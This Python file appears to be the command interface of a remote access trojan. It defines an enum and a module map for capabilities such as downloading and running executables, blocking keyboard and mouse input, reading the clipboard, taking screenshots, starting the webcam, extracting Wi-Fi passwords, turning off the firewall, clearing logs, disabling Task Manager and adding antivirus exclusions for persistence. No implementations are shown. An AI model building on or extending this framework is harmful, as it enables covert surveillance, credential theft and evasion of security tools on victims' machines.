from abc import ABC, abstractmethod
from enum import Enum
from pydantic import BaseModel



class Command(Enum):
    # File System Commands
    DOWNLOAD_FILE_HTTP = "DOWNLOAD_FILE_HTTP"
    DOWNLOAD_RUN_EXE = "DOWNLOAD_RUN_EXE"
    LISTDIR = "LISTDIR"
    GET_START_UP_CONTENTS = "GET_START_UP_CONTENTS"
    CHDIR = "CHDIR"
    GETCWD = "GETCWD"
    LIST_CURRENT_DIRECTORY = "LIST_CURRENT_DIRECTORY"
    DELETE_FILE = "DELETE_FILE"
    DELETE_FOLDER = "DELETE_FOLDER"
    MAKE_DIRECTORY = "MAKE_DIRECTORY"
    SPAM_FOLDERS = "SPAM_FOLDERS"
    MAKE_SHORTCUT = "MAKE_SHORTCUT"
    MOVE_FILE = "MOVE_FILE"
    # Input/Output Commands
    REVERSE_MOUSE_BUTTON = "REVERSE_MOUSE_BUTTON"
    BLOCK_ALL_INPUT = "BLOCK_ALL_INPUT"
    UNBLOCK_ALL_INPUT = "UNBLOCK_ALL_INPUT"
    BLOCK_MOUSE = "BLOCK_MOUSE"
    UNBLOCK_MOUSE = "UNBLOCK_MOUSE"
    BLOCK_MOUSE_SECONDS = "BLOCK_MOUSE_SECONDS"
    BLOCK_ALL_SECONDS = "BLOCK_ALL_SECONDS"
    BLOCK_SMART_SECONDS = "BLOCK_SMART_SECONDS"
    GET_CLIPBOARD = "GET_CLIPBOARD"
    PASTE_TO_CLIPBOARD = "PASTE_TO_CLIPBOARD"
    CLIPBOARD_FILLER = "CLIPBOARD_FILLER"
    FILLER_OFF = "FILLER_OFF"
    GET_FOREGROUND_WINDOW_TITLE = "GET_FOREGROUND_WINDOW_TITLE"
    STOP_DISABLER = "STOP_DISABLER"
    DISABLE_CURRENT_WINDOWS_CONTINOUS = "DISABLE_CURRENT_WINDOWS_CONTINOUS"
    ENABLE_CURRENT_WINDOW = "ENABLE_CURRENT_WINDOW"
    DISABLE_CURRENT_WINDOW = "DISABLE_CURRENT_WINDOW"

    # Surveillance Commands
    SCREENSHOT = "SCREENSHOT"
    GET_AVAILABLE_DEVICES = "GET_AVAILABLE_DEVICES"
    START_CAMERA = "START_CAMERA"

    # System Commands
    CREATE_ACCOUNT = "CREATE_ACCOUNT"
    GET_ACCOUNTS = "GET_ACCOUNTS"
    DISABLE_CMD_FULLY = "DISABLE_CMD_FULLY"
    DISABLE_CMD = "DISABLE_CMD"
    ENABLE_CMD = "ENABLE_CMD"
    FIREWALL_ON = "FIREWALL_ON"
    FIREWALL_OFF = "FIREWALL_OFF"
    GET_CPU_USAGE = "GET_CPU_USAGE"
    GET_RAM_USAGE_INFO = "GET_RAM_USAGE_INFO"
    GET_DISK_USAGE_INFO = "GET_DISK_USAGE_INFO"
    GET_DISK_INFO = "GET_DISK_INFO"
    GET_HOSTFILE_CONTENTS = "GET_HOSTFILE_CONTENTS"
    WRITE_HOSTFILE_CONTENTS = "WRITE_HOSTFILE_CONTENTS"
    GET_INSTALLED_PROGRAMS = "GET_INSTALLED_PROGRAMS"
    RUN_UNINSTALLER = "RUN_UNINSTALLER"
    ENABLE_INTERNET = "ENABLE_INTERNET"
    DISABLE_INTERNET = "DISABLE_INTERNET"
    CLEAR_LOGS = "CLEAR_LOGS"
    GET_ADAPTER_STATS = "GET_ADAPTER_STATS"
    GET_ADAPTERS = "GET_ADAPTERS"
    GET_DEVICES_ON_NETWORK = "GET_DEVICES_ON_NETWORK"
    GET_WIFI_NETWORKS_WINDOWS = "GET_WIFI_NETWORKS_WINDOWS"
    GET_WIFI_PASSWORDS_WINDOWS = "GET_WIFI_PASSWORDS_WINDOWS"
    GET_IP_INFO = "GET_IP_INFO"
    GET_COUNTRY = "GET_COUNTRY"
    GET_PUBLIC_IP = "GET_PUBLIC_IP"
    MINIMIZE_ALL_WINDOWS = "MINIMIZE_ALL_WINDOWS"
    FREEZE_PC = "FREEZE_PC"
    LOGOUT = "LOGOUT"
    RESTART = "RESTART"
    SHUTDOWN = "SHUTDOWN"
    KILL_PROCESS = "KILL_PROCESS"
    GET_PROCESSES = "GET_PROCESSES"
    GEO_LOCATE = "GEO_LOCATE"
    GET_USERNAME = "GET_USERNAME"
    GET_UPTIME = "GET_UPTIME"
    GET_SYSTEM_INFO = "GET_SYSTEM_INFO"
    ENABLE_TASKMANAGER = "ENABLE_TASKMANAGER"
    DISABLE_TASKMANAGER = "DISABLE_TASKMANAGER"

    # Troll Commands
    SHOW_MESSAGE_BOX = "SHOW_MESSAGE_BOX"
    RUN_TROLL_SCRIPT = "RUN_TROLL_SCRIPT"
    OPEN_CAMERA_APP = "OPEN_CAMERA_APP"
    CHANGE_WALLPAPER_HTTP = "CHANGE_WALLPAPER_HTTP"
    EJECT_CD = "EJECT_CD"
    EJECT_CD_CONTINOUS = "EJECT_CD_CONTINOUS"
    STOP_CD_EJECTOR = "STOP_CD_EJECTOR"
    TYPE_MESSAGE_NOTEPAD = "TYPE_MESSAGE_NOTEPAD"
    SHOW_WEBSITE = "SHOW_WEBSITE"

    # Persistence Commands
    ADD_EXTENSION_EXCLUSION = "ADD_EXTENSION_EXCLUSION"
    REMOVE_EXTENSION_EXCLUSION = "REMOVE_EXTENSION_EXCLUSION"
    ADD_FOLDER_EXCLUSION = "ADD_FOLDER_EXCLUSION"
    REMOVE_FOLDER_EXCLUSION = "REMOVE_FOLDER_EXCLUSION"
    
command_to_module_map = {
    # File System Commands
    Command.DOWNLOAD_FILE_HTTP: "file_system",
    Command.DOWNLOAD_RUN_EXE: "file_system",
    Command.LISTDIR: "file_system",
    Command.GET_START_UP_CONTENTS: "file_system",
    Command.CHDIR: "file_system",
    Command.GETCWD: "file_system",
    Command.LIST_CURRENT_DIRECTORY: "file_system",
    Command.DELETE_FILE: "file_system",
    Command.DELETE_FOLDER: "file_system",
    Command.MAKE_DIRECTORY: "file_system",
    Command.SPAM_FOLDERS: "file_system",
    Command.MAKE_SHORTCUT: "file_system",
    Command.MOVE_FILE: "file_system",
    
    # Input/Output Commands
    Command.REVERSE_MOUSE_BUTTON: "input_output",
    Command.BLOCK_ALL_INPUT: "input_output",
    Command.UNBLOCK_ALL_INPUT: "input_output",
    Command.BLOCK_MOUSE: "input_output",
    Command.UNBLOCK_MOUSE: "input_output",
    Command.BLOCK_MOUSE_SECONDS: "input_output",
    Command.BLOCK_ALL_SECONDS: "input_output",
    Command.BLOCK_SMART_SECONDS: "input_output",
    Command.GET_CLIPBOARD: "input_output",
    Command.PASTE_TO_CLIPBOARD: "input_output",
    Command.CLIPBOARD_FILLER: "input_output",
    Command.FILLER_OFF: "input_output",
    Command.GET_FOREGROUND_WINDOW_TITLE: "input_output",
    Command.STOP_DISABLER: "input_output",
    Command.DISABLE_CURRENT_WINDOWS_CONTINOUS: "input_output",
    Command.ENABLE_CURRENT_WINDOW: "input_output",
    Command.DISABLE_CURRENT_WINDOW: "input_output",

    # Surveillance Commands
    Command.SCREENSHOT: "surveillance",
    Command.GET_AVAILABLE_DEVICES: "surveillance",
    Command.START_CAMERA: "surveillance",

    # System Commands
    Command.CREATE_ACCOUNT: "system",
    Command.GET_ACCOUNTS: "system",
    Command.DISABLE_CMD_FULLY: "system",
    Command.DISABLE_CMD: "system",
    Command.ENABLE_CMD: "system",
    Command.FIREWALL_ON: "system",
    Command.FIREWALL_OFF: "system",
    Command.GET_CPU_USAGE: "system",
    Command.GET_RAM_USAGE_INFO: "system",
    Command.GET_DISK_USAGE_INFO: "system",
    Command.GET_DISK_INFO: "system",
    Command.GET_HOSTFILE_CONTENTS: "system",
    Command.WRITE_HOSTFILE_CONTENTS: "system",
    Command.GET_INSTALLED_PROGRAMS: "system",
    Command.RUN_UNINSTALLER: "system",
    Command.ENABLE_INTERNET: "system",
    Command.DISABLE_INTERNET: "system",
    Command.CLEAR_LOGS: "system",
    Command.GET_ADAPTER_STATS: "system",
    Command.GET_ADAPTERS: "system",
    Command.GET_DEVICES_ON_NETWORK: "system",
    Command.GET_WIFI_NETWORKS_WINDOWS: "system",
    Command.GET_WIFI_PASSWORDS_WINDOWS: "system",
    Command.GET_IP_INFO: "system",
    Command.GET_COUNTRY: "system",
    Command.GET_PUBLIC_IP: "system",
    Command.MINIMIZE_ALL_WINDOWS: "system",
    Command.FREEZE_PC: "system",
    Command.LOGOUT: "system",
    Command.RESTART: "system",
    Command.SHUTDOWN: "system",
    Command.KILL_PROCESS: "system",
    Command.GET_PROCESSES: "system",
    Command.GEO_LOCATE: "system",
    Command.GET_USERNAME: "system",
    Command.GET_UPTIME: "system",
    Command.GET_SYSTEM_INFO: "system",
    Command.ENABLE_TASKMANAGER: "system",
    Command.DISABLE_TASKMANAGER: "system",

    # Troll Commands
    Command.SHOW_MESSAGE_BOX: "troll",
    Command.RUN_TROLL_SCRIPT: "troll",
    Command.OPEN_CAMERA_APP: "troll",
    Command.CHANGE_WALLPAPER_HTTP: "troll",
    Command.EJECT_CD: "troll",
    Command.EJECT_CD_CONTINOUS: "troll",
    Command.STOP_CD_EJECTOR: "troll",
    Command.TYPE_MESSAGE_NOTEPAD: "troll",
    Command.SHOW_WEBSITE: "troll",

    # Persistence Commands
    Command.ADD_EXTENSION_EXCLUSION: "persistence",
    Command.REMOVE_EXTENSION_EXCLUSION: "persistence",
    Command.ADD_FOLDER_EXCLUSION: "persistence",
    Command.REMOVE_FOLDER_EXCLUSION: "persistence",
}

class CommandArgs(BaseModel):
    pass

class CommandResult(BaseModel):
    result: str
    success: bool

class ICommandModule(ABC):
    @abstractmethod
    def run(self, command: Command, args: CommandArgs) -> CommandResult | None:
        pass